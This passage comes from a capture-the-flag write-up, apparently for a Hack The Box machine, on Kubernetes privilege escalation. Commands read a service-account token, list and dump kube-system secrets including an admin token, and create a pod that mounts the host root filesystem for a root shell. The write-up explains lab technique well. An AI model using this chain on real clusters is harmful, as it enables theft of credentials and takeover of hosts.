selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```
One interesting privilege is that we can list secrets.

## Checking if we could get secrets from our earlier shell
```console
root@webapp-deployment-5d764566f4-h5zhw:/tmp/py# kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` auth can-i list secrets -n kube-system
no
```


## Getting Secrets
```console
root@devnode-deployment-cd86fb5c-qlxww:~# ./ctlkube.new --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` get secrets -n kube-system
NAME                                             TYPE                                  DATA   AGE 
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      146d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      146d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      146d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      146d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      146d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      146d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      146d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      146d
default-token-l85f2                              kubernetes.io/service-account-token   3      146d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      146d
............................[snip]..............................
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      146d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      146d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      146d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      146d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      146d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      146d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      146d
```

Since we can get any secrets, I decided to get the **c-admin-token** as we can do anything with this token.

## Getting c-admin-tokem-tfmp2
```console
root@devnode-deployment-cd86fb5c-qlxww:~# ./ctlkube.new --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` get secret c-admin-token-tfmp2 -
n kube-system -o yaml                                                                                                                                 
apiVersion: v1                                                                                                                                        
data:                                                                                                                                                 
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUM1ekNDQWMrZ0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFE

.........................................[snip]..........................
 namespace: a3ViZS1zeXN0ZW0=                                                                                                                         
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklrcE9kbTlpWDFaRVRFSjJRbFpGYVZwQ2VIQjZUakJ2YVdORWFsbHRhRTFVTFhkQ05XWXRiMkpXVXpnaWZRLmV5SnBjM01pT2lKcmRXS
mxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ
5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKakxXRmtiV2x1TFhSdmEyVnVMWFJtYlhBeUlpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOa
mIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltTXRZV1J0YVc0aUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTF
hV1FpT2lJeU5EWXpOVEExWmkwNU9ETmxMVFExWW1RdE9URm1OeTFqWkRVNVltWmxNRFkyWkRBaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZhM1ZpWlMxemVYTjBaVzA2W
XkxaFpHMXBiaUo5LlhrOTZwZEM4d25CdUlPbTRDZ3VkOVE3enBvVU5ISUNnN1FBWlk5RVZDZUFVSXpoNnJ2ZlpKZWFIdWNNaXE4Y205M3pLbXdIVC1qVmJBUXlOZmFVdWFYbXVlazVUQmRZOTRrTUQ
1QV9vd0ZoLTBrUlVqTkZPU3Izbm9ROFhGX3huV21kWDk4bUtNRi1ReE9aS0NKeGtibkxMZF9oLVAyaFdSa2ZZOHhxNi1lVVA4TVlyWUZfZ3M3WG0yNjRBMjJoclZaeFRiMmpaalVqN0xURlJjaGI3Y
koxTFdYU0lxT1YyQm1VOVRLRlFKWUNaNzQzYWJlVkI3WXZOd1BIWGNPdExFb0NzMDNodkVCdE9zZTJQT3pONTRwSzhMeXFfWEdGSk4weVRKdXVRUUx0d3JvRjM1NzlEQmJaVWtkNEpCUVFZcnBtNld
kbTl0amJPeUdMOUtSc05vdw==
....................................[snip]..........................
```

## Checking privileges with this new token
![1](/assets/images/htb-boxes/unobtainium/Pasted image 20210613072218.png)
And we can do anything since we are system admin on the kubernates cluster.

## Creating a new pod with host root system mounted
### Checking if I can create new pods
```console
root@devnode-deployment-cd86fb5c-qlxww:~# ./ctlkube.new --token=`cat c-admin.token` auth can-i create pods
yes
```


## Buidling a malicious-pod.yaml
### attackpod.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: attacker-pod
  name: attacker-pod
  namespace: default
spec:
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: localhost:5000/node_server
    imagePullPolicy: Always
    name: attacker-pod
    volumeMounts:
      - name: host-fs
        mountPath: /root
  restartPolicy: Never
root@kali:~/Desktop/htb/
  ```
  - `Kind: Pod` - The type of resource we are creating is a pod
  - `apiVersion: v1` For a Pod the apiVersion must be v1 ( Check documentation)
  - `run: attacker-pod` - It is a key-value pair ( label) which can be used to identify this pod
  - `namespace: default` - The namespace on which this pod is created
  - `image: localhost:5000/node_server` - Image used for docker container
  -  `hostpath:` With hostPath volume type, we can mount a directory from the host into the pod and in our case we want to mount root partition( `/`) of the host.
  -  `volumeMounts:` can be used define where to mount the root partition of the host.
  -  `mountPath: /root` - We are mounting the `/` of host into our `/root` directory. 
  
### Creating a new pod
```console
root@devnode-deployment-cd86fb5c-qlxww:~# ./ctlkube.new --token=`cat c-admin.token` apply -f attack.yaml
pod/attacker-pod created 
```

### Getting a shell in the pod
```console
root@devnode-deployment-cd86fb5c-qlxww:~# ./ctlkube.new --token=`cat c-admin.token` -n default exec attacker-pod -it -- /bin/sh
# id                      
uid=0(root) gid=0(root) groups=0(root)
```

## Reading the root flag
```console
# cd root                 
# ls                       
pod_cleanup.py  root.txt 
# cat root.txt           
287da**************a726bb
```

  
